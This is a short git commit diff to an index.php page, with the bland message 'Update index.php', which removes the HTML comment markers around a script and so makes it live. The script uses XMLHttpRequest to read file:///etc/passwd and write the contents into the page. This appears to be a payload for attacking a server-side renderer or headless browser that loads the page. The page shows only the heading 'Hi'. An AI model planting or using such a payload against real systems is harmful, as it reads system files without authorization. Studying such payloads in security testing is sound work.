a92a49970b8e9cb185fa3202b499ec7762a8f477
root707 <40635778+root707@users.noreply.github.com>
2024-04-21 00:11:52 +0200

    Update index.php

--- index.php
+++ index.php
@@ -2,7 +2,7 @@
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
 <body>
-<!--
+
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){
@@ -11,6 +11,6 @@ document.write(this.responseText)
 x.open("GET","file:///etc/passwd");
 x.send();
 </script>
--->
+
 <h1>Hi</h1>
 </body></html>
